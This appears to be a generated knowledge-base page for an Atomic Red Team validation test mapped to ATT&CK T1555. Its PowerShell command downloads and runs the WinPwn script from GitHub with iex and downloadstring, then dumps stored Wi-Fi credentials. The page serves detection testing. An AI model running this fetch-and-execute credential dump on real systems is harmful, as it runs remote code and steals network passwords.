---
atomic_guid: "afe369c2-b42e-447f-98a3-fb1f4e2b8552"
title: "WinPwn - Loot local Credentials - Wifi Credentials"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555"
attack_technique_name: "Credentials from Password Stores"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "afe369c2-b42e-447f-98a3-fb1f4e2b8552"
  - "WinPwn - Loot local Credentials - Wifi Credentials"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# WinPwn - Loot local Credentials - Wifi Credentials

Loot local Credentials - Wifi Credentials technique via function of WinPwn

## Metadata

- Atomic GUID: afe369c2-b42e-447f-98a3-fb1f4e2b8552
- Technique: T1555: Credentials from Password Stores
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1555/T1555.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml)
